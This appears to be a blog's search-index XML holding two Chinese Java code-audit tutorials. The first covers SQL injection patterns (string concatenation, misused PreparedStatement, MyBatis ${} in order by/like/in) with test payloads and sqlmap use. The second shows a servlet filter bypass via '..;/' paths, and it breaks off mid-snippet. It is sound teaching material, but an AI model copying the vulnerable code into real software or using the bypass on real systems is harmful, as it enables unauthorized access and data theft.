<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>代码审计之SQL注入</title>
      <link href="/2022/10/11/dai-ma-shen-ji-zhi-sql-zhu-ru/"/>
      <url>/2022/10/11/dai-ma-shen-ji-zhi-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​                                                        要对每一个明天怀有恰到好处的期待。</p><h2 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入?"></a>0x01 SQL注入?</h2><p>当请求没有经过严格的过滤的时候，攻击者便可以将一段SQL代码插入到请求中，服务端接受该恶意请求后，便会执行恶意的SQL命令，理论上任何数据交互的请求如果没有经过任何有效的过滤，都会造成SQL注入。</p><p>以下是我在学习java代码审计中遇到的几种可能造成SQL注入的场景。</p><h2 id="0x02-直接动态拼接"><a href="#0x02-直接动态拼接" class="headerlink" title="0x02 直接动态拼接"></a>0x02 直接动态拼接</h2><p>示例代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span>JdbcTemplate jdbcTemplate<span class="token punctuation">;</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/sql"</span><span class="token punctuation">)</span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">>></span> <span class="token function">userList</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> String id<span class="token punctuation">)</span><span class="token punctuation">{</span>    String sql <span class="token operator">=</span> <span class="token string">"select * from users where id="</span><span class="token operator">+</span>id<span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">>></span> maps <span class="token operator">=</span> jdbcTemplate<span class="token punctuation">.</span><span class="token function">queryForList</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> maps<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将@RequestParam获取的id拼接在sql语句中，并通过jdbcTemplate.queryForList执行SQL语句，期间没有经过任何的过滤，因此这里存在SQL注入。</p><pre><code>and 1=1</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011015346535.png"></p><pre><code>and 1=2</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011015418217.png"></p><p>用sqlmap也能直接跑出数据库</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011015507113.png"></p><h2 id="0x03-预编译有误"><a href="#0x03-预编译有误" class="headerlink" title="0x03 预编译有误"></a>0x03 预编译有误</h2><p>使用PreparedStatement来执行SQL语句是因为预编译参数化查询能够有效地防止SQL注入，但是由于开发者的个人习惯没有严格按照PreparedStatement的开发方式进行查询，导致在预编译语句中使用了错误的编程方式，同样也会产生注入。</p><p>示例代码</p><pre><code>@RequestMapping(&quot;/vul&quot;)public String vul(@RequestParam(&quot;username&quot;) String username) throws ClassNotFoundException, SQLException &#123;    StringBuilder result = new StringBuilder();    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);    Connection connect = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/java_sec_code?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true&quot;,&quot;root&quot;,&quot;1q2w3e4r&quot;);    String name = username;    String id = &quot;1&quot;;    String sql = &quot;SELECT * FROM users where id=?&quot;;    sql += &quot;and username like &#39;%&quot;+name+&quot;%&#39;&quot;;    PreparedStatement st = conn.prepareStatement(sql);    st.setString(1,id);    ResultSet rs = st.executeQuery();    while (rs.next()) &#123;        String res_name = rs.getString(&quot;username&quot;);        String res_pwd = rs.getString(&quot;password&quot;);        String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);        result.append(info);    &#125;    rs.close();    connect.close();    return result.toString();    &#125;</code></pre><p>以上代码中虽然参数id做了预编译，但是username却直接进行拼接，这种方式直接导致了SQL注入漏洞的产生。</p><p>用SQLMAP验证SQL注入</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221011024813430.png"></p><h1 id="0x04-order-by注入"><a href="#0x04-order-by注入" class="headerlink" title="0x04 order by注入"></a>0x04 order by注入</h1><p>在预编译语句中按照规范也不能彻底防止SQL注入，因为在有些特殊情况下不能使用prepareStatement。order by子句后需要加字段名或者字段位置，而字段名是不能加引号的，否则就会被认为是一个字符串而不是字段名。</p><p>prepareStatement是使用占位符传入参数的，传递的字符都会有单引号包裹，”st.setString(1, id);”会自动加上引号，这样就会导致order by子句失效，这种情况下，智能使用字符拼接的方式，如果要防御SQL注入，就要进行关键字的过滤。</p><p>示例代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/vul"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">jdbc_sqli_sec</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> String id<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException<span class="token punctuation">{</span>    StringBuilder result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>    Connection connect <span class="token operator">=</span> DriverManager<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    String sql <span class="token operator">=</span> <span class="token string">"select * from users"</span><span class="token operator">+</span><span class="token string">"order by"</span><span class="token operator">+</span>id<span class="token punctuation">;</span>    PreparedStatement st <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    ResultSet rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String res_name <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String res_pwd <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String info <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%s: %s\n"</span><span class="token punctuation">,</span> res_name<span class="token punctuation">,</span> res_pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    rs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connect<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-和-的区别"><a href="#0x05-和-的区别" class="headerlink" title="0x05 #{}和${}的区别"></a>0x05 #{}和${}的区别</h1><p>在MyBatis中，#{}在底层实现上使用”?”作为占位符来生成prepareStatement，也是参数化查询预编译的机制，而${}将传入的数据直接显示在SQL语句中，类似于字符串拼接，可能会导致SQL注入。</p><pre><code>SELECT * FROM user WHERE id=#&#123;id&#125;  //安全的写法SELECT * FROM user WHERE id=$&#123;id&#125;  //不安全的写法</code></pre><p>示例代码，在”userMapprt.xml”定义SQL映射文件中设置的是”${id}”不安全写法</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mybatis.userMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getUser<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mybatis.sql.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=${id}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x06-Mybatis常见SQL注入漏洞"><a href="#0x06-Mybatis常见SQL注入漏洞" class="headerlink" title="0x06 Mybatis常见SQL注入漏洞"></a>0x06 Mybatis常见SQL注入漏洞</h1><p>1)、order by 查询</p><p>order by不能使用参数化查询的方式，只能使用字符拼接的方式，而在Mybatis中#{}是进行参数化查询的，要使用order by只能使用${}，如果开发者没有对此进行关键字过滤，则会导致SQL注入的产生。</p><pre><code>&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt;    &lt;select id=&quot;OrderByUsername&quot; resultMap=&quot;User&quot;&gt;        select * from users order by $&#123;id&#125;    &lt;/select&gt;    &lt;/mapper&gt;</code></pre><p>2)、like查询</p><p>Mybatis的like子句中使用#{}会报错，为了避免报错，只能使用${}，例如</p><pre><code>select * from users where name like &#39;%$&#123;user&#125;%&#39;;</code></pre><p>但${}会产生SQL注入，要避免SQL注入就要设置filter对其参数进行过滤。漏洞代码如下</p><pre><code>&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt;    &lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;        select * from users where username like &#39;%$&#123;_parameter&#125;%&#39;    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>3)、in参数</p><p>​    在Mybatis的in子句中使用#{}会将多个参数当作一个整体，示例代码如下</p><pre><code>&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt;    &lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;        select * from users where username in (#&#123;user&#125;)    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>在Mybatis的in子句中使用#{}参数化查询，会将“select * from users where username in (#{user})”转变成</p><p>“select * from users where username like (“‘user1’,’user2’,’user4’”)”，这样把”‘user1’,’user2’,’user4’”当成一个整体，无法查询到数据，为了避免这个问题，只能使用${}，而${}会进行字符拼接，如果没有经过任何过滤，则会导致SQL注入。</p><p>4)、总结</p><pre><code>1、Mybatis框架下审计SQL注入，重点关注在三个方面like，in和order by 2、xml方式编写sql时，可以先筛选xml文件搜索$,逐个分析，要特别注意mybatis-generator的order by注入 3、Mybatis注解编写sql时方法类似 4、java层面应该做好参数检查，假定用户输入均为恶意输入，防范潜在的攻击</code></pre><h1 id="0x07-SQL注入代码审计总结"><a href="#0x07-SQL注入代码审计总结" class="headerlink" title="0x07 SQL注入代码审计总结"></a>0x07 SQL注入代码审计总结</h1><p>总结了下面几种常见的关键字，我们可以通过这些关键字快速定位到SQL语句</p><pre><code>StatementcreateStatementPrepareStatementlike &#39;%$&#123;in($&#123;selectupdateinsert</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filter权限绕过总结</title>
      <link href="/2022/10/10/filter-quan-xian-rao-guo-zong-jie/"/>
      <url>/2022/10/10/filter-quan-xian-rao-guo-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​        挖掘越权或者无条件RCE时，很多系统大部分地方都做了权限控制，在java中，通常会通过filter进行接口的鉴权来达到权限控制的目的，这个时候对权限绕过的挖掘就显得格外重要了，这里就总结下自己在java中权限绕过的一些心得。</p><h2 id="0x01-代码实现"><a href="#0x01-代码实现" class="headerlink" title="0x01 代码实现"></a>0x01 代码实现</h2><p>web.xml</p><pre class="line-numbers language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--servlet的配置入口--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.root.servlet.system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.root.servlet.login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--主页--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/main.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--登录--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/system/login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.root.filter.ossFileter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/main.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.root.filter.ossFileter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/system/login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写两个servlet<br>login.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">login</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"login page."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>system.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">system</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String url <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"this is main page!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写一个filter</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ossFileter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest servletRequest<span class="token punctuation">,</span> ServletResponse servletResponse<span class="token punctuation">,</span> FilterChain filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        String url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/system/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".do"</span><span class="token punctuation">)</span> <span class="token operator">||</span> url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"admin=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"unauthorized access"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        简单解释下filter的作用，这里使用getRequestURI()获取url路径并赋值给变量url，如果获取到的路径为/system/login，则直接进入doFilter()放行，当获取到的路径中含有”.do”或者”.action”，且cookie不含有”admin=1”时，则进行拦截。<br>直接访问main.do响应”unauthorized access”<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221010215456098.png"></p><h2 id="0x02-绕过思路"><a href="#0x02-绕过思路" class="headerlink" title="0x02 绕过思路"></a>0x02 绕过思路</h2><h3 id="1、-绕过"><a href="#1、-绕过" class="headerlink" title="1、../绕过"></a>1、../绕过</h3><p>我们先看看这块代码的逻辑</p><pre class="line-numbers language-java"><code class="language-java">String url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/system/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​        当获取的路径是/system/login时，符合规则匹配，直接进入doFilter，这个时候我们可以使用../来跳转到根目录，即构造url是<code>http://192.168.3.2:8080/system/login/..;/..;/main.do</code>时，实际上访问的是<code>http://192.168.3.2:8080/main.do</code>，达到了我们权限绕过的目的。<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662788489288-0cf8508e-6698-4779-adaa-abfd8adeb0ea.png"><br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662788577527-8a719d92-d7c9-4e28-9d0c-43aee1ae2cd3.png"><br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662788587300-3f78463f-d398-48b8-9f0e-254945f5403f.png"></p><p>修复方式也很简单，只要在代码中加入判断路径是否含有”../“即可</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token 